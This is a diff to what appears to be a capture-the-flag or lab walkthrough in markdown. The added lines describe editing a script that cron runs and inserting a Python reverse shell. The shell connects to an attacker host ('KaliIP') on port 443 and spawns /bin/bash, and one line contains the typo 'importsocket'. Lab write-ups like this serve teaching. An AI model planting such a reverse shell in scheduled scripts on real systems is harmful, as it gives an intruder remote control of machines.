@@ -86,8 +86,14 @@ Checking the `crontab` we found a script that runs everytime :
   <img width="940" height="664" alt="image" src="https://github.com/user-attachments/assets/460604cd-c453-4f78-aea4-226665fed19b" />
 </p>
 
+We edited the script and added this line :
+
+import pty;
+importsocket,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("KaliIP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")
 
 
+  <img width="940" height="853" alt="image" src="https://github.com/user-attachments/assets/d8a8b84f-ec60-4dd5-836b-489b7c3c9bf5" />
 
 
 
